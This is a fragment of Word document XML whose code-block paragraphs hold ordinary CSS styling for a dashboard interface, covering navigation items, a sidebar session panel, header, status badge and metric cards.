    <w:p w14:paraId="098DA0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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194960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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFAE5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letter-spacing: 0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A42585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E4374A5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4CDEA7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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CD816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24px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AE9BE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4431681" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC341E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.nav-label {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C4427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0 12px 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293699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#687680;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA5445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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153CB8F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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5590CE5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letter-spacing: 0.12em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F49E8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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4178D0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2DC8A91" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71BCC00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.nav-item {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711FC73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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B29D6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min-height: 42px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1E95E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 2px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13688E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10px 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D22A84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gap: 11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="259F003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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD815F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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FCEC83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var(--nav-text);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE2F3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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA3ED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border-radius: 6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE036E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font-family: inherit;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA7B1C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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5B37E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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C7C0C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text-align: left;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFA7E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transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DD5AE5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cursor: pointer;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398DB4D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C5E89C6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21D82E3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.nav-item svg {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D720A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width: 17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0A1A3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height: 17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9C3C3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flex: 0 0 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBE14F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stroke-width: 1.7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203646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D2F2A60" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="757992A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.nav-item:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53FBA1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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77792C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rgba(255, 255, 255, 0.06);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAC03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8002B68" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="298DED5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.nav-item.active {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D774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var(--nav-active);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18AAC34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#1a2b32;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A11A2A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border-left-color: transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419AAFA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box-shadow: inset 3px 0 #38a08f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665237B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B316131" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="306A879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.nav-item:focus-visible {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E0903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outline: 2px solid #70c8b5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F083D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outline-offset: 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A21D85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1F74DB78" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="611452F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.sidebar-session {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C006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 auto 16px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B7FA8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15px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2511EA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#98a8ae;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5EF15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 1px solid rgba(255, 255, 255, 0.08);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445D8E9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border-radius: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543323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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D6486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rgba(255, 255, 255, 0.02);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA56F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8AD2C1A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5681D6E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.session-heading {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E1F617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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EB1F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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3186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gap: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660F037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margin-bottom: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6904641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#e0e8e9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687F9B5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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0278520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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEF60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letter-spacing: 0.08em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665EDA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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FFAC90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2FFAE46" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15CD6FE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.session-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="054A947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width: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192D43E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height: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7893167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border-radius: 50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD19E6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#56bca5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB5F6A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box-shadow: 0 0 0 3px rgba(86, 188, 165, 0.12);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C3874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02AAF1A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="408C444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.session-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602404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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60C8B3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justify-content: space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA0491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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3621894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7px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9CDF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border-top: 1px solid rgba(255, 255, 255, 0.06);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0027047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3E423C5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="123D402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.session-row strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D28BC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#f1f5f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="724A38C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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2471D7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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E68312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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E320CE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125665D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32D4C7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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280821D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min-width: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0686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45CF759" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D89E43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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0474A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min-height: 76px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFD36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14px 30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C24109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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9DC44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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3580AE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4B0F141" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33241A0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.header-status {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B07B9C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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426F51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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438905A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gap: 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AABCD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BE89067" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13F882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.last-updated {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA6F2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#7b888d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B135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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63594B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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AFDDE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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE1E6E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164E87D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5737EDC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.header-copy h1 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17AAF55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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1492ED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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BFCA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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCE9C7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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44568B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letter-spacing: -0.01em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="473585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B545BA9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E4D4A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.header-copy p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1642E1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margin: 4px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE4A07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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EC00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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE45B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6924520" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3472888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.status-badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28ECB4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7px 11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC91C5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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D50B7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#f1f8f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA171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 1px solid #cfe5dd;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08920F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border-radius: 999px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666A6B4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font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BA1AC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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="245715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600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD0C5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letter-spacing: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5337CD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1EC9E2F9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4215325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.pulse-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423808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width: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA402C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height: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010BC0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animation: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE1BC3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0FD45D3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F6C5A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.tab-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC7EA4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26px 30px 36px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7274BD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scrollbar-color: #bcc6cd transparent;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039746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scrollbar-width: thin;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D84C66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9BCF8CC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71A182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.content-width {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1C154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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C691BA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max-width: 1500px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275603B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 0 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29D8A87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7C2DCA7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0997D83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.section-heading {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214DD4C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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41E97FC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align-items: flex-end;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D713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justify-content: space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171A20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gap: 20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60615E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 0 0 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1264FBF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722323A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05EDC7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.section-heading h2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0DE01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.section-heading h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455B9B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 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666CCEA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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77403AC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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761CA06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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4342E98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905FD50" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75D3F06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.section-heading p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB99F1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 4px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121823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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="430FD9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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522945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14555945" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="294E76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.refresh-note {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423500D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#7a8791;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="066D3DE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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EC70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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A7B74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1300780" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A9C7D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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7074A8D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grid-template-columns: repeat(4, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467D33C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gap: 14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C37B7F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margin-bottom: 24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1098C5A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FE2C851" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A2BBDE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.card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B21A8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min-height: 148px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2556994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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0643A8A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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CA95F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 1px solid var(--border-color) !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C5E12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border-radius: 9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5C5E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box-shadow: var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64ACD38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53CD191" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19407F7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.card-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A67DA1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margin-bottom: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D27867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#65727d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505E6D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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A3708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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061FBDB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letter-spacing: 0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABEA9F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F8B4C4F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DFB5BE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.card-header svg {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0161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#83919c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12FE52D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1BBC3DD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B55C8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.metric-value {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E6BC9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color: #16212a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DD816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30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B983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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36085B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letter-spacing: -0.035em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79B561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E6AF3B3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2813DF7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.metric-unit {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D71808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margin-left: 3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265B69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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFB37C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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F97E4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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5128AAF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0340EEA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="082CF58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.metric-meta {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD44A0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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E28F6C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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148F793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gap: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2A46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margin-top: 32px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D1A30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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C68161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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502536F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EBA992B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
